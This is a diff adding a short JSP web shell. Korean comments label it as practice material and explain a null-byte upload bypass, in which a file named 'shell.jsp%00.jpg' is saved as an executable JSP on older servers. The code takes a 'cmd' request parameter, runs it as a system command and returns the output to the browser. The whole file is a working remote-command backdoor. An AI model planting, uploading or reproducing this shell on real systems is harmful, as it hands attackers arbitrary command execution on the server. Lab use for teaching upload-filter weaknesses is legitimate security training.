@@ -1,0 +1,14 @@
+<%@ page import="java.io.*" %>
+<%
+    // [실습용] Null Byte 우회 웹쉘
+    // 파일명: shell.jsp%00.jpg
+    // 일부 구버전 서버/언어에서 %00(null byte) 이후 문자열 무시
+    // → 실제 저장 파일명이 shell.jsp 로 처리되는 취약점
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {
+        Process p = Runtime.getRuntime().exec(cmd);
+        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        while ((line = r.readLine()) != null) out.println(line + "<br>");
+    }
+%>
